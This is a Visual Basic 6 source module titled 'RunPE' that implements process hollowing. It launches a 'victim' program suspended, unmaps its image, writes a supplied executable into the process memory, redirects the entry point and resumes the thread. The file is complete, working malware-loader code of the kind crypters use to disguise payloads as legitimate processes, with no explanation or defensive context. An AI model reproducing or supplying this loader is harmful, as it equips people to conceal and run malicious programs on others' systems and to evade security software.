Attribute VB_Name = "RunPE"
Option Explicit
Const SIZE_OF_80387_REGISTERS = 80
Type FLOATING_SAVE_AREA
     ControlWord As Long
     StatusWord As Long
     TagWord As Long
     ErrorOffset As Long
     ErrorSelector As Long
     DataOffset As Long
     DataSelector As Long
     RegisterArea(1 To SIZE_OF_80387_REGISTERS) As Byte
     Cr0NpxState As Long
End Type
Public Type CONTEXT86
    ContextFlags As Long
    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long
    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type
Public Const CONTEXT_X86 = &H10000
Public Const CONTEXT86_CONTROL = (CONTEXT_X86 Or &H1)
Public Const CONTEXT86_INTEGER = (CONTEXT_X86 Or &H2)
Public Const CONTEXT86_SEGMENTS = (CONTEXT_X86 Or &H4)
Public Const CONTEXT86_FLOATING_POINT = (CONTEXT_X86 Or &H8)
Public Const CONTEXT86_DEBUG_REGISTERS = (CONTEXT_X86 Or &H10)
Public Const CONTEXT86_FULL = (CONTEXT86_CONTROL Or CONTEXT86_INTEGER Or CONTEXT86_SEGMENTS)
Public Declare Function GetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT86) As Long
Public Declare Function SetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT86) As Long
Public Declare Function SuspendThread Lib "kernel32" (ByVal hThread As Long) As Long
Public Declare Function ResumeThread Lib "kernel32" (ByVal hThread As Long) As Long
Public Type PROCESS_INFORMATION
   hProcess As Long
   hThread As Long
   dwProcessId As Long
   dwThreadId As Long
End Type
Public Type STARTUPINFO
   cb As Long
   lpReserved As String
   lpDesktop As String
   lpTitle As String
   dwX As Long
   dwY As Long
   dwXSize As Long
   dwYSize As Long
   dwXCountChars As Long
   dwYCountChars As Long
   dwFillAttribute As Long
   dwFlags As Long
   wShowWindow As Integer
   cbReserved2 As Integer
   lpReserved2 As Long        'LPBYTE
   hStdInput As Long
   hStdOutput As Long
   hStdError As Long
End Type
Public Declare Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
'Public Declare Function ZwUnmapViewOfSection Lib "ntdll.dll" (ByVal hProcess As Long, ByVal BaseAddress As Long) As Long
Public Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Public Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Public Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Public Declare Function VirtualProtectEx Lib "kernel32" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Const CREATE_SUSPENDED = &H4
Public Const MEM_COMMIT As Long = &H1000&
Public Const MEM_RESERVE As Long = &H2000&
Public Const PAGE_NOCACHE As Long = &H200
Public Const PAGE_EXECUTE_READWRITE As Long = &H40
Public Const PAGE_EXECUTE_WRITECOPY As Long = &H80
Public Const PAGE_EXECUTE_READ As Long = &H20
Public Const PAGE_EXECUTE As Long = &H10
Public Const PAGE_READONLY As Long = &H2
Public Const PAGE_WRITECOPY As Long = &H8
Public Const PAGE_NOACCESS As Long = &H1
Public Const PAGE_READWRITE As Long = &H4
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, Src As Any, ByVal L As Long)
Private Enum ImageSignatureTypes
    IMAGE_DOS_SIGNATURE = &H5A4D
    IMAGE_OS2_SIGNATURE = &H454E
    IMAGE_OS2_SIGNATURE_LE = &H454C
    IMAGE_VXD_SIGNATURE = &H454C
    IMAGE_NT_SIGNATURE = &H4550
End Enum
Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type
Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    Characteristics As Integer
End Type
Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type
Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
Private Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY
End Type
Private Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type
Const IMAGE_SIZEOF_SHORT_NAME = 8
Private Type IMAGE_SECTION_HEADER
   SecName As String * IMAGE_SIZEOF_SHORT_NAME
   VirtualSize As Long
   VirtualAddress  As Long
   SizeOfRawData As Long
   PointerToRawData As Long
   PointerToRelocations As Long
   PointerToLinenumbers As Long
   NumberOfRelocations As Integer
   NumberOfLinenumbers As Integer
   Characteristics  As Long
End Type
Const OFFSET_4 = 4294967296#

Public Function RunExe(ByVal sVictim As String, abExeFile() As Byte) As Long
    Dim idh As IMAGE_DOS_HEADER
    Dim inh As IMAGE_NT_HEADERS
    Dim ish As IMAGE_SECTION_HEADER
    Dim pi As PROCESS_INFORMATION
    Dim si As STARTUPINFO
    Dim context As CONTEXT86
    Dim ImageBase As Long, ret As Long, i As Long
    Dim addr As Long, lOffset As Long
    CopyMemory idh, abExeFile(0), Len(idh)
    If idh.e_magic <> IMAGE_DOS_SIGNATURE Then
       Exit Function
    End If
    CopyMemory inh, abExeFile(idh.e_lfanew), Len(inh)
    If inh.Signature <> IMAGE_NT_SIGNATURE Then
       Exit Function
    End If
    si.cb = Len(si)
    If CreateProcess(vbNullString, sVictim, 0, 0, False, CREATE_SUSPENDED, 0, 0, si, pi) = 0 Then
       Exit Function
    End If
    context.ContextFlags = CONTEXT86_INTEGER
    If GetThreadContext(pi.hThread, context) = 0 Then GoTo ClearProcess
    Call ReadProcessMemory(pi.hProcess, ByVal context.Ebx + 8, addr, 4, 0)
    If addr = 0 Then GoTo ClearProcess
    If CallAPIbyName("ntdll.dll", "ZwUnmapViewOfSection", pi.hProcess, addr) Then GoTo ClearProcess
    ImageBase = VirtualAllocEx(pi.hProcess, ByVal inh.OptionalHeader.ImageBase, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)
    If ImageBase = 0 Then GoTo ClearProcess
    Call WriteProcessMemory(pi.hProcess, ByVal ImageBase, abExeFile(0), inh.OptionalHeader.SizeOfHeaders, ret)
    lOffset = idh.e_lfanew + Len(inh)
    For i = 0 To inh.FileHeader.NumberOfSections - 1
        CopyMemory ish, abExeFile(lOffset + i * Len(ish)), Len(ish)
        Call WriteProcessMemory(pi.hProcess, ByVal ImageBase + ish.VirtualAddress, abExeFile(ish.PointerToRawData), ish.SizeOfRawData, ret)
        Call VirtualProtectEx(pi.hProcess, ByVal ImageBase + ish.VirtualAddress, ish.VirtualSize, Protect(ish.Characteristics), addr)
    Next i
    Call WriteProcessMemory(pi.hProcess, ByVal context.Ebx + 8, ImageBase, 4, ret)
    context.Eax = ImageBase + inh.OptionalHeader.AddressOfEntryPoint
    Call SetThreadContext(pi.hThread, context)
    Call ResumeThread(pi.hThread)
    Exit Function
ClearProcess:
    CloseHandle pi.hThread
    CloseHandle pi.hProcess
End Function

Private Function Protect(ByVal Characteristics As Long) As Long
Dim Mapping As Variant
 Mapping = Array(PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE)
 Protect = Mapping(RShift(Characteristics, 29))
End Function

Private Function RShift(ByVal lValue As Long, ByVal lNumberOfBitsToShift As Long) As Long
 RShift = vbLongToULong(lValue) / (2 ^ lNumberOfBitsToShift)
End Function

Private Function vbLongToULong(ByVal Value As Long) As Double
If Value < 0 Then
 vbLongToULong = Value + OFFSET_4
Else
 vbLongToULong = Value
End If
End Function


